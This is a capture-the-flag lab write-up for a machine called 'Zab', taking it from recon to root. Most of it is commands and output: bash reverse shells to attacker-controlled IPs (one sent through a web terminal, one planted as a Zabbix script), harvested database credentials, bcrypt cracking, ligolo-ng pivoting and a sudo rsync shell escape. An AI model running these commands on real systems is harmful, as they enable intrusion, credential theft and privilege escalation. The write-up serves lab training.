# CTF Writeup: Zab

---

## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 192.168.240.210
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-01 15:18 -0500
Nmap scan report for 192.168.240.210
Host is up (0.045s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 2e:5b:cb:6b:21:8c:fc:df:7b:c7:f7:f0:46:2e:6d:55 (ECDSA)
|_  256 ab:1a:ce:a7:f0:b6:0f:79:0b:54:b8:00:26:3d:69:58 (ED25519)
80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
6789/tcp open  http    Tornado httpd 6.3.3
|_http-server-header: TornadoServer/6.3.3
|_http-title: Mage
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT      ADDRESS
1   91.76 ms 192.168.45.1
2   91.83 ms 192.168.45.254
3   84.51 ms 192.168.251.1
4   84.65 ms 192.168.240.210

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.28 seconds
```

I started of with enumerating the website running on port 80. It's just an apache default page.

Enumerated Endpoints:

```
feroxbuster -u http://192.168.240.210     
                                                                                                                                              
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.240.210/
 🚩  In-Scope Url          │ 192.168.240.210
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      280c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      323c http://192.168.240.210/javascript => http://192.168.240.210/javascript/
200      GET      363l      961w    10671c http://192.168.240.210/
301      GET        9l       28w      330c http://192.168.240.210/javascript/jquery => http://192.168.240.210/javascript/jquery/
301      GET        9l       28w      322c http://192.168.240.210/pipelines => http://192.168.240.210/pipelines/
200      GET    10879l    44396w   288550c http://192.168.240.210/javascript/jquery/jquery
[####################] - 41s    90018/90018   0s      found:5       errors:29     
[####################] - 36s    30000/30000   834/s   http://192.168.240.210/ 
[####################] - 38s    30000/30000   783/s   http://192.168.240.210/javascript/ 
[####################] - 29s    30000/30000   1027/s  http://192.168.240.210/javascript/jquery/ 
[####################] - 0s     30000/30000   1034483/s http://192.168.240.210/pipelines/ => Directory listing (add --scan-dir-listings to scan)
```

Enumerated file extensions.

```
gobuster dir -u http://192.168.240.210/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt                               
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.240.210/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta.php             (Status: 403) [Size: 280]
/.hta                 (Status: 403) [Size: 280]
/.htaccess            (Status: 403) [Size: 280]
/.hta.txt             (Status: 403) [Size: 280]
/.hta.html            (Status: 403) [Size: 280]
/.htaccess.php        (Status: 403) [Size: 280]
/.htaccess.html       (Status: 403) [Size: 280]
/.htpasswd            (Status: 403) [Size: 280]
/.htaccess.txt        (Status: 403) [Size: 280]
/.htpasswd.php        (Status: 403) [Size: 280]
/.htpasswd.html       (Status: 403) [Size: 280]
/.htpasswd.txt        (Status: 403) [Size: 280]
/index.html           (Status: 200) [Size: 10671]
/index.html           (Status: 200) [Size: 10671]
/javascript           (Status: 301) [Size: 323] [--> http://192.168.240.210/javascript/]
/local.txt            (Status: 200) [Size: 33]
/server-status        (Status: 403) [Size: 280]
Progress: 18452 / 18452 (100.00%)
===============================================================
Finished
===============================================================
```

Retrieved local.txt in /var/www/html

```
0ac772f1c856fdbeefcd7912005e4956
```

Moved onto the 2nd website, since we couldn't retrieve anything useful.

Upon accessing the webpage, we got presented with a lot of functionalities. Including an "Terminal" as user "www-data".

Let's get RCE!

1. Started up listener on port 80.

```
nc -lvnp 80
```

2. Executed the following command on the Web Terminal.

```
/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.191/80 0>&1'
```

Gained RCE as user "www-data".

```
nc -lvnp 80                                 
listening on [any] 80 ...
connect to [192.168.45.191] from (UNKNOWN) [192.168.240.210] 37510
www-data@zab:/$
```

## Privilege Escalation

Performed Shell Hardening.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL + Z
stty raw -e echo ; fg ; reset
stty columns 200 rows 200
export TERM=xterm
```

Enumerated Users on the target system.

```
www-data@zab:/$ cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1001:Ubuntu:/home/ubuntu:/bin/bash
```

netstat wasn't available on the server, so I had to verify any running services with ps -aux. I found out that an mysql database is running internally.

```
mysql        951  0.9 25.1 1820268 506376 ?      Ssl  20:17   0:07 /usr/sbin/mysqld
```

Enumerated mysql directories.

```
www-data@zab:~/html$ find / -type d -iname "mysql" 2>/dev/null
/var/lib/mysql
/var/log/mysql
/etc/mysql
/usr/local/lib/python3.10/dist-packages/sqlalchemy/dialects/mysql
/usr/local/lib/python3.10/dist-packages/jedi/third_party/django-stubs/django-stubs/db/backends/mysql
/usr/local/lib/python3.10/dist-packages/mage_ai/server/frontend_dist/monaco-editor/min/vs/basic-languages/mysql
/usr/local/lib/python3.10/dist-packages/mage_ai/server/frontend_dist_base_path_template/monaco-editor/min/vs/basic-languages/mysql
/usr/lib/mysql
/usr/share/mysql
/usr/share/php8.1-mysql/mysql
/usr/share/zabbix/sql-scripts/mysql
```

I'm assuming we can find the mysqlconf inside /etc/mysql.

Upon checking up every mysql file we couldn't retrieve anything. 

Let's further analyse the running processes.

```
zabbix      1050  0.0  0.6 142872 13716 ?        S    20:18   0:00 /usr/sbin/zabbix_server -c /etc/zabbix/zabbix_server.conf
```

This process looked rather interesting.

Upon inspecting running internal processes with "ss". We find port 10050 & 10051 interesting.

```
www-data@zab:/etc/zabbix$ ss -tulnp
Netid            State             Recv-Q            Send-Q                       Local Address:Port                        Peer Address:Port            Process                                        
udp              UNCONN            0                 0                            127.0.0.53%lo:53                               0.0.0.0:*                                                              
tcp              LISTEN            0                 4096                         127.0.0.53%lo:53                               0.0.0.0:*                                                              
tcp              LISTEN            0                 511                                0.0.0.0:80                               0.0.0.0:*                                                              
tcp              LISTEN            0                 128                                0.0.0.0:22                               0.0.0.0:*                                                              
tcp              LISTEN            0                 4096                             127.0.0.1:10051                            0.0.0.0:*                                                              
tcp              LISTEN            0                 4096                             127.0.0.1:10050                            0.0.0.0:*                                                              
tcp              LISTEN            0                 100                              127.0.0.1:43827                            0.0.0.0:*                users:(("python3",pid=1312,fd=35))            
tcp              LISTEN            0                 100                              127.0.0.1:41783                            0.0.0.0:*                users:(("python3",pid=1312,fd=22))            
tcp              LISTEN            0                 151                              127.0.0.1:3306                             0.0.0.0:*                                                              
tcp              LISTEN            0                 100                              127.0.0.1:45285                            0.0.0.0:*                users:(("python3",pid=1312,fd=27))            
tcp              LISTEN            0                 100                              127.0.0.1:60631                            0.0.0.0:*                users:(("python3",pid=1312,fd=13))            
tcp              LISTEN            0                 100                              127.0.0.1:33891                            0.0.0.0:*                users:(("python3",pid=1312,fd=9))             
tcp              LISTEN            0                 100                              127.0.0.1:41389                            0.0.0.0:*                users:(("python3",pid=1312,fd=11))            
tcp              LISTEN            0                 70                               127.0.0.1:33060                            0.0.0.0:*                                                              
tcp              LISTEN            0                 128                                0.0.0.0:6789                             0.0.0.0:*                users:(("mage",pid=810,fd=18))
```

Those Ports seem to belong to Zabbix Application which we discovered earlier.
Since we can only access it internally, we'll have to utilize portforwarding. We don't have ssh access, so we can use an tool called "lingolo".

Before doing so, let's enumerate configuration files for zabbis.

Retrieved MySQL Database Credentials in /etc/zabbix/web directory.

```
www-data@zab:/etc/zabbix/web$ cat zabbix.conf.php 
<?php
// Zabbix GUI configuration file.

$DB['TYPE']       = 'MYSQL';
$DB['SERVER']     = 'localhost';
$DB['PORT']       = '0';
$DB['DATABASE']    = 'zabbix';
$DB['USER']       = 'zabbix';
$DB['PASSWORD']    = 'breadandbuttereater121';

// Schema name. Used for PostgreSQL.
$DB['SCHEMA']     = '';

// Used for TLS connection.
$DB['ENCRYPTION']  = false;
$DB['KEY_FILE']    = '';
$DB['CERT_FILE']   = '';
$DB['CA_FILE']     = '';
$DB['VERIFY_HOST']  = false;
$DB['CIPHER_LIST']  = '';

// Vault configuration. Used if database credentials are stored in Vault secrets manager.
$DB['VAULT']      = '';
$DB['VAULT_URL']   = '';
$DB['VAULT_PREFIX']  = '';
$DB['VAULT_DB_PATH']    = '';
$DB['VAULT_TOKEN']  = '';
$DB['VAULT_CERT_FILE']   = '';
$DB['VAULT_KEY_FILE']    = '';
$ZBX_SERVER_NAME   = 'zabbix server';

$IMAGE_FORMAT_DEFAULT   = IMAGE_FORMAT_PNG;
```

Logged into MySQL Database with zabbix:breadandbuttereater121

```
www-data@zab:/etc/zabbix/web$ mysql -u zabbix -p -h 127.0.0.1
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 45
Server version: 8.0.41-0ubuntu0.22.04.1 (Ubuntu)

Copyright (c) 2000, 2025, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

Retrieved encoded Administrator password for "zabbix".

```
mysql> SELECT * FROM users;
+--------+----------+--------+---------------+--------------------------------------------------------------+-----+-----------+------------+---------+---------+---------+----------------+------------+---------------+---------------+----------+--------+-----------------+----------------+
| userid | username | name   | surname       | passwd                                                       | url | autologin | autologout | lang    | refresh | theme   | attempt_failed | attempt_ip | attempt_clock | rows_per_page | timezone | roleid | userdirectoryid | ts_provisioned |
+--------+----------+--------+---------------+--------------------------------------------------------------+-----+-----------+------------+---------+---------+---------+----------------+------------+---------------+---------------+----------+--------+-----------------+----------------+
|      1 | Admin    | Zabbix | Administrator | $2y$10$KA6iPN5sY5.Z4KLerN7XOOO1P7jR8MD2e0SqNRXOsJjV1b.8c5Si. |     |         1 | 0          | default | 30s     | default |              0 |            |             0 |            50 | default  |      3 |            NULL |              0 |
|      2 | guest    |        |               | $2y$10$89otZrRNmde97rIyzclecuk6LwKAsHN0BcvoOKGjbT.BwMBfm7G06 |     |         0 | 15m        | default | 30s     | default |              0 |            |             0 |            50 | default  |      4 |            NULL |              0 |
+--------+----------+--------+---------------+--------------------------------------------------------------+-----+-----------+------------+---------+---------+---------+----------------+------------+---------------+---------------+----------+--------+-----------------+----------------+
2 rows in set (0.00 sec)
```

Bruteforced the encoded password utilizing john the ripper.

```
john admin.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
dinosaur         (?)     
1g 0:00:00:36 DONE (2026-01-02 02:32) 0.02732g/s 157.3p/s 157.3c/s 157.3C/s dreamgirl..palacios
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Let's try & login via ssh with the user "zabbix".

```
ssh zabbix@192.168.124.210                  
The authenticity of host '192.168.124.210 (192.168.124.210)' can't be established.
ED25519 key fingerprint is: SHA256:zGybM51OqAMNAvtsAKrqGeo/CjVbEFnKrQ1770n5nVk
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.124.210' (ED25519) to the list of known hosts.
zabbix@192.168.124.210's password: 

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Could not chdir to home directory /var/lib/zabbix/: No such file or directory
This account is currently not available.
Connection to 192.168.124.210 closed.
```

This didn't work. Which means we will have to portforward without ssh!

Downloaded ligolo-ng agent onto the target server and gave it executable permissions.

```
www-data@zab:/tmp$ wget http://192.168.45.224/ligolo-ng_linux_amd64
--2026-01-02 08:10:00--  http://192.168.45.224/ligolo-ng_linux_amd64
Connecting to 192.168.45.224:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6475928 (6.2M) [application/octet-stream]
Saving to: ‘ligolo-ng_linux_amd64’

ligolo-ng_linux_amd64                               0%[                                                                                       ligolo-ng_linux_amd64                               4%[====>                                                                                  ligolo-ng_linux_amd64                              10%[==========>                                                                            ligolo-ng_linux_amd64                              17%[==================>                                                                    ligolo-ng_linux_amd64                              22%[=======================>                                                               ligolo-ng_linux_amd64                              28%[==============================>                                                        ligolo-ng_linux_amd64                              35%[=====================================>                                                 ligolo-ng_linux_amd64                              40%[===========================================>                                           ligolo-ng_linux_amd64                              45%[=================================================>                                     ligolo-ng_linux_amd64                              52%[========================================================>                              ligolo-ng_linux_amd64                              58%[===============================================================>                       ligolo-ng_linux_amd64                              64%[======================================================================>                ligolo-ng_linux_amd64                              68%[==========================================================================>            ligolo-ng_linux_amd64                              74%[================================================================================>      ligolo-ng_linux_amd64                              79%[======================================================================================>ligolo-ng_linux_amd64                              85%[=======================================================================================ligolo-ng_linux_amd64                              91%[=======================================================================================ligolo-ng_linux_amd64                              97%[=======================================================================================ligolo-ng_linux_amd64                             100%[=============================================================================================================>]   6.18M  1.77MB/s    in 3.6s    

2026-01-02 08:10:04 (1.73 MB/s) - ‘ligolo-ng_linux_amd64’ saved [6475928/6475928]
```

Gave the agent executable permissions.

```
chmod +x ligolo-ng_linux_amd64
```

On my local machine configured and started up ligolo-ng.

```
sudo ip tuntap add user saitama mode tun ligolo
sudo ip link set ligolo up
```

```
ligolo-proxy -selfcert    
INFO[0000] Loading configuration file ligolo-ng.yaml    
WARN[0000] daemon configuration file not found. Creating a new one... 
? Enable Ligolo-ng WebUI? No
WARN[0020] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
ERRO[0020] Certificate cache error: acme/autocert: certificate cache miss, returning a new certificate 
INFO[0020] Listening on 0.0.0.0:11601                   
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _                                                                                             
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/                                                                                             
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ /                                                                                              
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /                                                                                               
        /____/                          /____/                                                                                                
                                                                                                                                              
  Made in France ♥            by @Nicocha30!                                                                                                  
  Version: dev                                                                                                                                
                                                                                                                                              
ligolo-ng »
```

Executed the following command on the target server.

```
www-data@zab:/tmp$ ./ligolo-ng_linux_amd64 -connect 192.168.45.224:11601 -ignore-cert
WARN[0000] warning, certificate validation disabled     
INFO[0000] Connection established                        addr="192.168.45.224:11601"
```

Then I moved back to our running ligolo-ng and selected an session.

```
session
```

Started the process of portforwarding.


```
start
```

I then added the ligolo magic ip to the ip route table on my local machine.

```
sudo ip route add 240.0.0.1/32 dev ligolo
```

We are now able to access port 10050 and 10051 and all other ports of the target server.

But upon observing them, we can't find anything. After some research we realise that zabbix is often mapped to the webroot in apache. Let's check it!

```
http://240.0.0.1/zabbix
```

Logged in with

```
Admin:dinosaur
```

After inspecting the webpage, we are able to create scripts on Alert > Scripts > Create Script.

I then selected the following:

```
Name: pwned
Scope: Manual Host Action
Type: Script
Execute on: Zabbix proxy or server
Commands: /bin/bash -c 'bash -i >& /dev/tcp/192.168.45.224/22 0>&1'
```

And then added it.

Started up my listener on port 22.

```
nc -lvnp 22
```

I then was able to execute our script upon navigating to Monitoring > Hosts > Zabbix Server > pwned.

Gained RCE as user "zabbix".

```
nc -lvnp 22           
listening on [any] 22 ...
connect to [192.168.45.224] from (UNKNOWN) [192.168.124.210] 41404
bash: cannot set terminal process group (1803): Inappropriate ioctl for device
bash: no job control in this shell
zabbix@zab:/$
```

Checked sudo permissions for user "zabbix". He is able to run the rsync binary with sudo permissions.

```
zabbix@zab:/$ sudo -l
sudo -l
Matching Defaults entries for zabbix on zab:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User zabbix may run the following commands on zab:
    (ALL : ALL) NOPASSWD: /usr/bin/rsync
```

I then utilized the following PoC from www.gtfobins.github.io in order to elevate privileges to user "root".

```
zabbix@zab:/$ sudo /usr/bin/rsync -e 'sh -p -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
<nc -e 'sh -p -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
whoami
root
```

Retrieved proof.txt in /root directory.

```
c61bfe67f30370da2c8c4377bc6e70e6
```
